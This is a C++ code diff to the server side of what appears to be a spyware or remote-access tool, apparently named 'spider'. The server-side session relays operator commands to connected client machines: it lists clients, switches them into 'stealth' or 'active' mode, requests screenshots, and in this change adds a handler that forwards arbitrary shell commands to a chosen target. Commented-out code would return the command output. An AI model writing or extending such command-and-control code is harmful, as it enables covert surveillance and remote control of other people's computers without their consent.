@@ -26,13 +26,15 @@ namespace spi
                            const std::vector<SpiderClientSession::Pointer> &clts) :
             CommandableSession(io, ctx, "shell-session"), _clients(clts)
         {
-            _cmdHandler.onMessages(boost::bind(&ShellClientSession::sendList, this, _1), proto::MessageType::RList);
+            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__sendList, this, _1), proto::MessageType::RList);
             _cmdHandler.onMessages(boost::bind(&ShellClientSession::__handleStealthMode, this, _1),
                                    proto::MessageType::RStealthMode);
             _cmdHandler.onMessages(boost::bind(&ShellClientSession::__handleActiveMode, this, _1),
                                    proto::MessageType::RActiveMode);
-            _cmdHandler.onMessages(boost::bind(&ShellClientSession::handleScreenshot, this, _1),
+            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__handleScreenshot, this, _1),
                                    proto::MessageType::RScreenshot);
+            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__handleRunShell, this, _1),
+                                   proto::MessageType::RRunShell);
         }
 
         virtual ~ShellClientSession() noexcept = default;
@@ -40,7 +42,9 @@ namespace spi
         void startSession() noexcept
         {
             asyncHandshake(net::SSLConnection::HandshakeType::Server,
-                           boost::bind(&ShellClientSession::handleHandshake, this, net::ErrorPlaceholder));
+                           boost::bind(&ShellClientSession::handleHandshake,
+                                       shared_from_this_cast<ShellClientSession>(),
+                                       net::ErrorPlaceholder));
         }
 
     private:
@@ -89,43 +93,100 @@ namespace spi
             __transmitRequest<proto::RActiveMode, proto::ActiveMode>(loggable);
         }
 
-        void handleScreenshot(const ILoggable &loggable)
+        void __handleScreenshot(const ILoggable &loggable)
         {
             __transmitRequest<proto::RScreenshot, proto::Screenshot>(loggable);
         }
 
-        void sendList([[maybe_unused]] const ILoggable &loggable)
+        void __sendList([[maybe_unused]] const ILoggable &loggable)
         {
             proto::RListReply repl;
 
             for (const auto &cur : _clients) {
                 if (cur->hasCommandConn()) {
-                    repl.connectedClients.push_back(cur->getID());
+                    repl.clients.push_back(cur->getID());
                 }
             }
-            Buffer buff;
             ErrorCode ec;
 
-            repl.serializeTypeInfo(buff);
-            repl.serialize(buff);
-            _conn.writeSome(buff, ec);
-
+            sendCommand(repl, ec);
             if (ec)
                 _errorCb(this);
         }
+
+        void __replyError() noexcept
+        {
+            proto::ReplyCode rc;
+
+            rc.code = proto::ReplyType::KO;
+            ErrorCode ec;
+            sendCommand(rc, ec);
+            if (ec)
+                _errorCb(this);
+        }
+
+        void __handleRunShell(const ILoggable &l)
+        {
+            const proto::RRunShell &rrsh = static_cast<const proto::RRunShell &>(l);
+            auto ptr = __findClient(rrsh.target);
+
+            if (ptr) {
+                proto::RunShell rsh;
+                rsh.cmd = rrsh.cmd;
+
+                ErrorCode ec;
+                ptr->sendCommand(rsh, ec);
+                if (!ec) {
+//                    _asyncCmdBuff.resize(proto::MessageHeaderSize + proto::RawData::SerializedSize);
+//                    ptr->asyncReceiveCommand(net::BufferView(_asyncCmdBuff.data(), _asyncCmdBuff.size()),
+//                                             boost::bind(&ShellClientSession::__asyncHandleRawData,
+//                                                         shared_from_this_cast<ShellClientSession>(), ptr, _1));
+                } else
+                    __replyError();
+            } else
+                __replyError();
+        }
+
+//        void __asyncHandleRawData(SpiderClientSession *cli, const ErrorCode &err)
+//        {
+//            if (!err) {
+//                auto type = _cmdHandler.identifyMessage(_asyncCmdBuff);
+//
+//                if (type != proto::MessageType::RawData
+//                    || _asyncCmdBuff.size() != proto::MessageHeaderSize + proto::RawData::SerializedSize) {
+//                    __replyError();
+//                    return;
+//                }
+//
+//                _asyncCmdBuff.erase(_asyncCmdBuff.begin(), _asyncCmdBuff.begin() + 4);
+//                proto::RawData rd(_asyncCmdBuff);
+//
+//                Buffer buff(rd.bytes.size());
+//                ErrorCode ec;
+//                cli->connection().readSome(net::BufferView(buff.data(), buff.size()), ec);
+//
+//                rd.bytes = spi::Serializer::unserializeBytes(buff, 0, buff.size());
+//                std::string output(rd.bytes.begin(), rd.bytes.end());
+//                std::cout << "Command output: " << output << ", " << rd.bytes.size() << std::endl;
+//                sendCommand(rd, ec);
+//                std::cout << "SENT" << std::endl;
+//                if (ec)
+//                    _errorCb(this);
+//            }
+//        }
 
     public:
         void sendCommand(const ILoggable &l, ErrorCode &ec) noexcept
         {
             Buffer buff;
 
-            l.serializeTypeInfo(buff);
             l.serialize(buff);
             _conn.writeSome(buff, ec);
         }
 
     private:
         const std::vector<SpiderClientSession::Pointer> &_clients;
+        Buffer _asyncCmdBuff;
     };
 }
 
